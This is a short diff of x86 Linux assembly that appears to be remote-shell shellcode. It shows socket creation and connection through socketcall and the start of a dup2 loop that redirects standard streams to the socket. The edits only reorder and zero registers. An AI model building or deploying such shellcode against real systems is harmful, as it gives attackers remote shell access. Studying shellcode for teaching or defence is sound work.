@@ -8,13 +8,15 @@ _start:
 
   ; Socket creation
   xor ebx, ebx
+  xor eax, eax
+  xor ecx, ecx
+  xor edx, edx
   inc ebx
 
-  xor edx, edx
   push edx
 
   push ebx
-  push byte 0x02
+  push byte 0x2
 
   mov ecx, esp
   mov al, 0x66
@@ -30,19 +32,19 @@ _start:
   push bx
   mov ecx, esp
 
-  inc ebx
   push byte 0x10
   push ecx
   push esi
 
   mov ecx, esp
+  inc ebx
   mov al, 0x66
   int 0x80
 
 
   ; Dup2
   xor ecx, ecx
-  mov ebx, esi
+  xchg ebx, esi
 
 dup:
   mov al, 0x3f
